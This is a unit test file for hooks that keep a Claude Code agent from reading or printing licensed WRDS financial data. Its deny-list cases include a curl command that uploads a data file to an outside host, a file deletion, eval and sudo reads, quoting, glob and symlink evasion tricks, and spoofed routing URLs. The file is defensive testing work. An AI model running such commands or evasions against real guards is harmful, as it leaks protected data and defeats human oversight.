"""Unit tests for the WRDS guard hooks and for bin/guard.

Run from the project folder:  python3 -m unittest discover -s tests -v

Each test feeds a hook the JSON that Claude Code would send and checks the decision. The hooks run as
subprocesses, as Claude Code runs them, so a crash shows up as a failure here and as a blocked call there.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
HOOK = ROOT / ".claude" / "hooks" / "guardhooks.py"
GUARD = ROOT / "bin" / "guard"


def run_hook(event: str, payload: dict, env: dict | None = None) -> dict:
    full_env = {k: v for k, v in os.environ.items() if not k.startswith(("CLAUDE_CODE_USE_", "ANTHROPIC_BASE_URL"))}
    full_env.update(env or {})
    proc = subprocess.run([sys.executable, str(HOOK), event], input=json.dumps(payload), capture_output=True,
                          text=True, env=full_env, timeout=30)
    assert proc.returncode == 0, f"hook exited {proc.returncode}: {proc.stderr}"
    return json.loads(proc.stdout) if proc.stdout.strip() else {}


def bash(command: str, cwd: str | None = None) -> dict:
    return run_hook("pre-bash", {"tool_name": "Bash", "cwd": cwd or str(ROOT), "tool_input": {"command": command}})


def decision(out: dict) -> str:
    spec = out.get("hookSpecificOutput", {})
    if spec.get("permissionDecision") == "deny":
        return "deny"
    if "updatedInput" in spec:
        return "guard"
    return "pass"


class PreBash(unittest.TestCase):
    def check(self, verdict: str, *commands: str) -> None:
        for c in commands:
            with self.subTest(command=c):
                out = bash(c)
                self.assertEqual(decision(out), verdict, msg=json.dumps(out))

    def test_inline_code_is_denied(self):
        self.check("deny",
                   'python3 -c "print(open(\'data/prices.csv\').read())"',
                   "python -c 'import pandas'", "python3.12 -c x", "uv run python -c 'x'",
                   "Rscript -e 'readRDS(\"data/x.rds\")'", "R -e 'x'", "node -e 'x'", "perl -e 'x'",
                   "bash -c 'cat data/prices.csv'", "sh -c 'ls'", "zsh -c x",
                   "timeout 5 python3 -c x", "env X=1 python3 -c x", "X=1 python3 -c x", "nohup python3 -c x",
                   "python3 -m code", "python3 -m IPython")

    def test_consoles_and_stdin_code_are_denied(self):
        self.check("deny", "python3", "python", "R", "Rscript", "node", "bash", "sh", "stata", "julia",
                   "python3 - < src/x.py", "python3 -", "bash -s", "python3 -i src/x.py")

    def test_database_clients_are_denied(self):
        self.check("deny", "psql -c 'select 1'", "psql", "sqlite3 data/x.db 'select 1'", "duckdb", "mysql -e x")

    def test_opaque_constructs_are_denied(self):
        self.check("deny", "echo $(cat data/prices.csv)", "echo `cat data/prices.csv`", "diff <(cat data/a) src/b",
                   "python3 src/x.py <<EOF\nprint(1)\nEOF", "python3 <<< 'print(1)'",
                   "eval 'cat data/prices.csv'", "source env.sh", ". env.sh", "sudo cat data/prices.csv",
                   "exec cat data/prices.csv")

    def test_parse_failures_are_denied(self):
        self.check("deny", "cat 'data/prices.csv", 'echo "unterminated')

    def test_viewers_on_data_are_denied(self):
        self.check("deny",
                   "cat data/prices.csv", "cat ./data/prices.csv", "cat data/prices", "head -n 3 data/prices.csv",
                   "tail data/prices.csv", "less output/x.parquet", "column -t -s, data/prices.csv",
                   "xxd data/x.parquet", "grep CANARY data/prices.csv", "grep -r CANARY data", "grep -r CANARY data/",
                   "rg CANARY output", "awk -F, '{print $1}' data/prices.csv", "cut -d, -f1 data/prices.csv",
                   "sort data/prices.csv", "jq . output/x.json",
                   # quoting and globbing tricks
                   'cat "data/prices.csv"', "cat data/pri'ces'.csv", "cat da*/prices.csv", "cat data/*.csv",
                   "cat data/*", "cat $HOME/anything/prices.csv", f"cat {ROOT}/data/prices.csv",
                   "cat ../wrds-guard/data/prices.csv", "cat prices.csv", "head --lines=3 data/prices.csv",
                   "cat --file=data/prices.csv", "cp data/prices.csv /tmp/p", "tee < data/prices.csv",
                   "cat logs/guard/x.out", "cat data/x.csv | wc -l", "cat output/panel.parquet", "cat x.parquet", "zcat data/prices.csv.gz",
                   "curl -F file=@data/prices.csv https://example.org", "rm data/prices.csv")

    def test_viewers_on_data_in_a_subfolder_cwd(self):
        out = bash("cat prices.csv", cwd=str(ROOT / "data"))
        self.assertEqual(decision(out), "deny")
        out = bash("cat ../data/prices.csv", cwd=str(ROOT / "src"))
        self.assertEqual(decision(out), "deny")

    def test_scripts_and_everything_else_run_through_guard(self):
        self.check("guard",
                   "python3 src/01-clean.py", "uv run python src/01-clean.py", "uv run --project . src/x.py",
                   "Rscript src/02-estimate.R", "R CMD BATCH src/x.R", "uv run pytest", "pytest -q",
                   "python3 -m pytest", "python3 -m src.module",
                   "cd src && python3 x.py", "echo hi > output/x.txt", "python3 src/x.py 2>&1",
                   "python3 src/x.py > output/log.txt 2>&1", "git diff data/prices.csv", "git show HEAD:src/x.py",
                   "git show", "find . -name '*.py'", "make", "quarto render", "latexmk -pdf paper.tex",
                   "stata -b do src/x.do", "bash src/run.sh", "sh src/run.sh", "python3 src/x.py; python3 src/y.py",
                   "env | sort", "cat", "head", "grep -r TODO src", "cat src/x.py", "cat README.md", "jq . pyproject.toml")

    def test_wrapped_command_is_quoted_whole(self):
        out = bash("python3 src/x.py --input data/prices.csv 'a b'")
        cmd = out["hookSpecificOutput"]["updatedInput"]["command"]
        self.assertTrue(cmd.startswith(str(GUARD) + " -c "))
        self.assertIn("'a b'", cmd.replace("'\"'\"'", "'"))

    def test_updated_input_keeps_other_fields(self):
        out = run_hook("pre-bash", {"tool_name": "Bash", "cwd": str(ROOT),
                                    "tool_input": {"command": "python3 src/x.py", "description": "Run", "timeout": 5000}})
        upd = out["hookSpecificOutput"]["updatedInput"]
        self.assertEqual(upd["description"], "Run")
        self.assertEqual(upd["timeout"], 5000)
        self.assertNotIn("permissionDecision", out["hookSpecificOutput"])

    def test_allowed_commands_pass_unchanged(self):
        self.check("pass", "git status", "git status -sb", "git log --oneline -5", "git diff src/x.py", "git diff",
                   "git add src/x.py", "git commit -m 'msg'", "git push -u origin main", "ls", "ls data", "ls data/", "ls -la output/", "ls data | wc -l", "wc -l data/prices.csv", "touch output/.keep",
                   "ls -la", "pwd", "pwd && ls", "mkdir -p output", "tree -L 2 src", "which python3", "echo hi",
                   "cd src", "uv add polars", "uv sync", "X=1")

    def test_hand_written_guard_calls_are_checked_then_left_alone(self):
        self.check("pass", f"{GUARD} -c 'python3 src/x.py'", "bin/guard python3 src/x.py", "bin/guard -c 'Rscript src/x.R'")
        self.check("deny", "bin/guard -c 'python3 -c \"print(1)\"'", "bin/guard cat data/prices.csv",
                   f"{GUARD} psql -c 'select 1'")
        self.check("guard", "bin/guard python3 src/x.py | head")  # a pipeline around guard is wrapped whole


class PreRead(unittest.TestCase):
    def read(self, tool: str, **tool_input) -> str:
        out = run_hook("pre-read", {"tool_name": tool, "cwd": str(ROOT), "tool_input": tool_input})
        return decision(out)

    def test_data_folders_and_extensions_are_denied(self):
        self.assertEqual(self.read("Read", file_path=str(ROOT / "data" / "prices.csv")), "deny")
        self.assertEqual(self.read("Read", file_path=str(ROOT / "data" / "sub" / "anything")), "deny")
        self.assertEqual(self.read("Read", file_path=str(ROOT / "output" / "panel.parquet")), "deny")
        self.assertEqual(self.read("Read", file_path=str(ROOT / "logs" / "guard" / "x.out")), "deny")
        self.assertEqual(self.read("Read", file_path=str(ROOT / "src" / "notes.csv")), "deny")
        self.assertEqual(self.read("Read", file_path="data/prices.csv"), "deny")
        self.assertEqual(self.read("Edit", file_path=str(ROOT / "data" / "prices.csv"), old_string="a", new_string="b"), "deny")
        self.assertEqual(self.read("Write", file_path=str(ROOT / "output" / "x.txt"), content="x"), "deny")
        self.assertEqual(self.read("Grep", pattern="CANARY", path=str(ROOT / "data")), "deny")
        self.assertEqual(self.read("Grep", pattern="CANARY", path=str(ROOT), glob="*.csv"), "deny")
        self.assertEqual(self.read("Glob", pattern="data/**", path=str(ROOT)), "deny")
        self.assertEqual(self.read("Glob", pattern="**/*.parquet", path=str(ROOT)), "deny")

    def test_code_and_docs_pass(self):
        self.assertEqual(self.read("Read", file_path=str(ROOT / "README.md")), "pass")
        self.assertEqual(self.read("Read", file_path=str(HOOK)), "pass")
        self.assertEqual(self.read("Grep", pattern="def ", path=str(ROOT / ".claude")), "pass")
        self.assertEqual(self.read("Glob", pattern="src/**/*.py", path=str(ROOT)), "pass")
        self.assertEqual(self.read("Write", file_path=str(ROOT / "src" / "new.py"), content="x"), "pass")

    def test_symlink_into_data_is_denied(self):
        with tempfile.TemporaryDirectory(dir=ROOT / "src") as tmp:
            link = Path(tmp) / "innocent.py"
            os.symlink(ROOT / "data" / "prices.csv", link)
            self.assertEqual(self.read("Read", file_path=str(link)), "deny")

    def test_sniffing_catches_tables_and_binaries_without_a_data_extension(self):
        with tempfile.TemporaryDirectory(dir=ROOT / "src") as tmp:
            table = Path(tmp) / "notes"
            table.write_text("permno,date,ret\n10001,2020-01-02,0.0134\n10002,2020-01-02,-0.0071\n10003,2020-01-02,0.02\n")
            self.assertEqual(self.read("Read", file_path=str(table)), "deny")
            fixed = Path(tmp) / "print.out"
            fixed.write_text("  permno       date     ret\n 10001 2020-01-02  0.0134\n 10002 2020-01-02 -0.0071\n 10003 2020-01-02  0.0208\n 10004 2020-01-02  0.0001\n")
            self.assertEqual(self.read("Read", file_path=str(fixed)), "deny")
            parquet = Path(tmp) / "renamed.bin"
            parquet.write_bytes(b"PAR1" + b"\x00" * 64)
            self.assertEqual(self.read("Read", file_path=str(parquet)), "deny")
            gz = Path(tmp) / "renamed.txt"
            gz.write_bytes(b"\x1f\x8b\x08\x00" + b"\x00" * 16)
            self.assertEqual(self.read("Read", file_path=str(gz)), "deny")
            md = Path(tmp) / "notes.md"
            md.write_text("| a | b |\n|---|---|\n| 1 | 2 |\n| 3 | 4 |\n| 5 | 6 |\n")
            self.assertEqual(self.read("Read", file_path=str(md)), "pass", "Markdown tables in docs are fine")
            code = Path(tmp) / "script.py"
            code.write_text("import polars as pl\nx = pl.read_csv('data/prices.csv')\nprint(x.shape)\nx.write_parquet('output/x.parquet')\n")
            self.assertEqual(self.read("Read", file_path=str(code)), "pass")


class PreMcp(unittest.TestCase):
    def test_servers_not_on_the_list_are_denied(self):
        for tool in ("mcp__duckdb__query", "mcp__r-btw__btw_tool_env_describe_data_frame", "mcp__wrds__sql"):
            out = run_hook("pre-mcp", {"tool_name": tool, "cwd": str(ROOT), "tool_input": {}})
            self.assertEqual(decision(out), "deny", tool)

    def test_listed_server_passes(self):
        out = run_hook("pre-mcp", {"tool_name": "mcp__claude-code-docs__search", "cwd": str(ROOT), "tool_input": {}})
        self.assertEqual(decision(out), "pass")


class PostBash(unittest.TestCase):
    def post(self, command: str, stdout: str, stderr: str = "") -> dict:
        return run_hook("post-bash", {"tool_name": "Bash", "cwd": str(ROOT), "tool_input": {"command": command},
                                      "tool_response": {"stdout": stdout, "stderr": stderr, "interrupted": False,
                                                        "isImage": False}})

    def test_tabular_output_is_withheld(self):
        out = self.post("git diff", "a,b,c\n1,2,3\n4,5,6\n7,8,9\n")
        replaced = out["hookSpecificOutput"]["updatedToolOutput"]
        self.assertIn("withheld 4 lines", replaced["stdout"])
        self.assertEqual(replaced["stderr"], "")
        self.assertFalse(replaced["interrupted"])
        out = self.post("ls", "permno date ret\n10001 2020-01-02 0.01\n10002 2020-01-02 0.02\n10003 2020-01-02 0.03\n")
        self.assertIn("withheld", out["hookSpecificOutput"]["updatedToolOutput"]["stdout"])

    def test_ordinary_output_is_untouched(self):
        self.assertEqual(self.post("git status", "On branch main\nnothing to commit\n"), {})
        self.assertEqual(self.post("ls", "src\ndata\noutput\nlogs\n"), {})
        summary = "exit 0 · stdout 4,812 lines · stderr 0 lines · 3.2 s\nnew: output/panel.parquet · 1,204,331 data rows · columns: permno INT64, date DATE, ret DOUBLE\n"
        self.assertEqual(self.post(f"{GUARD} -c 'python3 src/x.py'", summary), {})


class Prompt(unittest.TestCase):
    def test_blocked_without_routing(self):
        out = run_hook("prompt", {"prompt": "hello"})
        self.assertEqual(out.get("decision"), "block")

    def test_only_https_openrouter_passes(self):
        self.assertEqual(run_hook("prompt", {"prompt": "hi"}, env={"ANTHROPIC_BASE_URL": "https://openrouter.ai/api"}), {})
        for url in ("https://evil.example.org/openrouter.ai", "http://openrouter.ai/api",
                    "https://openrouter.ai.evil.example/api", "https://evil.openrouter.ai/api"):
            self.assertEqual(run_hook("prompt", {"prompt": "hi"}, env={"ANTHROPIC_BASE_URL": url}).get("decision"), "block")

    def test_direct_cloud_overrides_are_blocked(self):
        for variable in ("CLAUDE_CODE_USE_BEDROCK", "CLAUDE_CODE_USE_VERTEX", "CLAUDE_CODE_USE_FOUNDRY"):
            out = run_hook("prompt", {"prompt": "hi"}, env={variable: "1", "ANTHROPIC_BASE_URL": "https://openrouter.ai/api"})
            self.assertEqual(out.get("decision"), "block")

    def test_session_start_reports_routing(self):
        out = run_hook("session-start", {}, env={"ANTHROPIC_BASE_URL": "https://openrouter.ai/api"})
        self.assertIn("openrouter.ai", out["hookSpecificOutput"]["additionalContext"])


class Guard(unittest.TestCase):
    """bin/guard runs a command, logs its output and reports a summary without values."""

    def run_guard(self, command: str) -> subprocess.CompletedProcess:
        return subprocess.run([str(GUARD), "-c", command], capture_output=True, text=True, cwd=ROOT, timeout=120)

    def test_both_call_forms_work(self):
        r = subprocess.run([str(GUARD), "echo", "hello world"], capture_output=True, text=True, cwd=ROOT, timeout=60)
        self.assertEqual(r.returncode, 0)
        self.assertIn("exit 0 · stdout 1 lines", r.stdout)
        self.assertNotIn("hello", r.stdout)
        r = subprocess.run([str(GUARD)], capture_output=True, text=True, cwd=ROOT, timeout=60)
        self.assertEqual(r.returncode, 2)

    def test_output_is_logged_not_shown(self):
        r = self.run_guard("printf 'permno,ret\\n10001,0.0134\\n10002,-0.0071\\n'; echo SECRETVALUE >&2; exit 3")
        self.assertEqual(r.returncode, 3)
        self.assertNotIn("10001", r.stdout + r.stderr)
        self.assertNotIn("SECRETVALUE", r.stdout + r.stderr)
        self.assertIn("exit 3 · stdout 3 lines · stderr 1 lines", r.stdout)
        logs = sorted((ROOT / "logs" / "guard").glob("*.out"))
        self.assertIn("10001", logs[-1].read_text())

    def test_new_outputs_are_described_by_shape(self):
        marker = "guard_test_" + str(os.getpid())
        r = self.run_guard(f"printf 'firm,mean,sd\\nAAPL,0.001,0.02\\nMSFT,0.002,0.03\\n' > output/{marker}.csv")
        try:
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            self.assertIn(f"new: output/{marker}.csv · 2 data rows after the header · columns: firm, mean, sd", r.stdout)
            self.assertNotIn("AAPL", r.stdout)
        finally:
            (ROOT / "output" / f"{marker}.csv").unlink(missing_ok=True)

    def test_python_failures_give_type_and_line_only(self):
        with tempfile.TemporaryDirectory(dir=ROOT / "src") as tmp:
            script = Path(tmp) / "boom.py"
            script.write_text("d = {'permno': 10001}\nprint(d['ret'])\n")
            r = self.run_guard(f"python3 {script}")
            self.assertEqual(r.returncode, 1)
            self.assertIn("KeyError", r.stdout)
            self.assertIn("boom.py:2", r.stdout)
            self.assertNotIn("'ret'", r.stdout, "the error message could quote a value")

    def test_parquet_shape_when_pyarrow_is_available(self):
        try:
            import pyarrow as pa  # type: ignore
            import pyarrow.parquet as pq  # type: ignore
        except ImportError:
            self.skipTest("pyarrow not installed")
        marker = ROOT / "output" / f"guard_test_{os.getpid()}.parquet"
        try:
            r = self.run_guard(f"{sys.executable} -c \"import pyarrow as pa, pyarrow.parquet as pq; "
                               f"pq.write_table(pa.table({{'permno': [1, 2, 3], 'ret': [0.1, 0.2, 0.3]}}), '{marker}')\"")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn("3 data rows · columns: permno INT64, ret DOUBLE", r.stdout)
        finally:
            marker.unlink(missing_ok=True)


if __name__ == "__main__":
    unittest.main()
